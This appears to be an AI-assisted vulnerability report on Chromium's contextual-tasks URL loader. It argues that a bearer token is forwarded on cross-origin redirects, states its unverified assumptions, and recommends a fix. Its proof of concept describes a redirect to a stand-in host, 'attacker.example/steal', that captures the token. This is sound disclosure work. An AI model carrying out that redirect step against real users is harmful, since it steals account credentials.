I found a concrete analog of CVE-2022-0451's root cause pattern (authorization header preserved across a cross-origin redirect) in the Contextual Tasks WebUI's proxying `URLLoader`.

### Title
Authorization Header Leaked to Cross-Origin Redirect Targets in ContextualTasksURLLoader - (File: chrome/browser/contextual_tasks/contextual_tasks_url_loader_factory_interceptor.cc)

### Summary
`ContextualTasksProxyingURLLoaderFactory::OnAccessTokenReceived` attaches an `Authorization: Bearer <token>` header to requests destined for an allow-listed origin (e.g. `google.com`) and hands the request off to `ContextualTasksURLLoader`, a `network::mojom::URLLoaderClient`/`URLLoader` pass-through implementation [1](#0-0) . Unlike every other header-injecting mechanism in this codebase (`AwURLLoaderThrottle::WillRedirectRequest`, `PlatformAuthNavigationThrottle`, the geolocation `X-Geo` header logic), which explicitly strip attached auth-like headers on cross-origin redirect via `removed_headers`/`RemoveRequestHeader` [2](#0-1) [3](#0-2) , `ContextualTasksURLLoader::FollowRedirect` does no origin comparison and no header stripping at all — it simply forwards whatever `headers_update_params` it receives straight to the real network `target_loader_`: [4](#0-3) 

### Finding Description
The only place that removes the injected `Authorization` header is `OnComplete`, and only in the narrow case of a CORS preflight failure (`IsPreflightError`) — the header is then stripped and the whole request retried from scratch [5](#0-4) . There is no logic in `FollowRedirect` (nor anywhere else on the redirect path) that inspects the redirect's target origin and strips the previously attached `Authorization` header when the request is redirected off the trusted `google.com`/`googlers.com` allow-list. The `network::mojom::URLLoader::FollowRedirect` contract explicitly supports a `removed_headers` list for exactly this purpose (as used correctly by `AwURLLoaderThrottle` and the enterprise platform-auth throttle), but `ContextualTasksURLLoader` never populates it — it is architecturally analogous to Dart's `HttpClient`, which (per CVE-2022-0451) forwarded the `Authorization` header on cross-origin redirects because it lacked origin-aware header-stripping in its redirect-following logic.

This code path is reachable from a `<webview>` inside the `chrome://contextual-tasks` WebUI, which is exercised by ordinary web content executing `fetch()`/navigation inside that guest view, as shown by the existing browser tests that drive requests through this exact factory via `webview.executeScript` [6](#0-5) . If the initial request target is on the allow-list (e.g. `accounts.google.com`) and that server responds with an HTTP redirect (e.g. via an open-redirect endpoint or attacker-influenced response) to an arbitrary attacker-controlled origin, the previously attached OAuth `Authorization: Bearer <token>` header will be replayed to that attacker-controlled origin.

### Impact Explanation
Leaking a live OAuth bearer token tied to the user's Google account to an attacker-controlled origin allows the attacker to impersonate the user against whatever API scope the token grants, i.e. cross-origin disclosure of a sensitive credential (`C:H` per the analog CVE's CVSS vector). This does not require memory corruption or a sandbox escape — it is a pure logic/SOP-adjacent header-disclosure bug, matching the "cross-origin disclosure" acceptance criterion.

### Likelihood Explanation
Exploitation requires (a) the guest `<webview>`/frame issuing a request to an allow-listed host, and (b) that host or an intermediary responding with a redirect to attacker infrastructure. I could not verify from the indexed code whether `google.com`/`googlers.com` endpoints reachable through this factory actually expose attacker-controllable open redirects, nor whether `net::URLRequest`'s lower-level redirect handling (outside this file) independently strips `Authorization` on cross-scheme/cross-origin moves before this custom loader ever sees it — that lower-layer behavior is not present in the indexed files I could inspect. This uncertainty affects likelihood, not root cause: the `ContextualTasksURLLoader::FollowRedirect` implementation itself unconditionally forwards headers with no origin check, which is the defect.

### Recommendation
In `ContextualTasksURLLoader::FollowRedirect` (or in `OnReceiveRedirect`), compare the redirect target origin against the origin the `Authorization` header was attached for (mirroring `AwURLLoaderThrottle::WillRedirectRequest`'s `SameDomainOrHost` check) and add `Authorization` to `headers_update_params.removed_headers` when the redirect leaves the trusted origin, before forwarding to `target_loader_->FollowRedirect`.

### Proof of Concept
1. Load `chrome://contextual-tasks` and drive its internal `<webview>` to fetch an allow-listed URL that has been set up (e.g., via a compromised/open-redirect endpoint) to respond with `302 Location: https://attacker.example/steal`, following the same test harness pattern already present in `contextual_tasks_url_loader_factory_interceptor_browsertest.cc` [6](#0-5) .
2. Observe that `attacker.example` receives the `Authorization: Bearer <token>` header, because `ContextualTasksURLLoader::FollowRedirect` forwards `headers_update_params` unmodified [4](#0-3)  with no stripping logic comparable to `OnComplete`'s preflight-only removal [5](#0-4) .
